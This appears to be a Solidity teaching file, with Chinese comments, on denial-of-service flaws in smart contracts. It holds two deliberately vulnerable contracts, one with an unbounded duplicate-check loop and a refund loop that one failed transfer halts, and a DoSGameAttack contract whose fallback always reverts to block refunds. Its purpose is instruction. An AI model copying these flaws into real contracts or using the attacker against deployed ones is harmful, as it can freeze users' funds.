// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract DoS {
    address[] entrants;

    function enter() public {
        // Check for duplicate entrants
        for (uint256 i; i < entrants.length; i++) {
            if (entrants[i] == msg.sender) {
                revert("You've already entered!");
            }
        }
        entrants.push(msg.sender);
    }
}

contract DoSGame {
    bool public refundFinished;
    mapping(address => uint256) public balanceOf;
    address[] public players;

    // 所有玩家存ETH到合约里
    function deposit() external payable {
        require(!refundFinished, "Game Over");
        require(msg.value > 0, "Please donate ETH");
        // 记录存款
        balanceOf[msg.sender] = msg.value;
        // 记录玩家地址
        players.push(msg.sender);
    }

    function refund() external {
        require(!refundFinished, "Game Over");
        uint256 pLength = players.length;
        for (uint256 i; i < pLength; i++) {
            address player = players[i];
            uint256 refundETH = balanceOf[player];
            (bool success,) = player.call{value: refundETH}("");
            require(success, "Refund Fail!");
            balanceOf[player] = 0;
        }
        refundFinished = true;
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract DoSGameAttack {
    // 退款时进行DoS攻击
    fallback() external payable {
        revert("DoS Attack!");
    }

    receive() external payable {
        revert("DoS Attack!");
    }

    // 参与DoS游戏并存款
    function attack(address gameAddr) external payable {
        DoSGame dos = DoSGame(gameAddr);
        dos.deposit{value: msg.value}();
    }
}
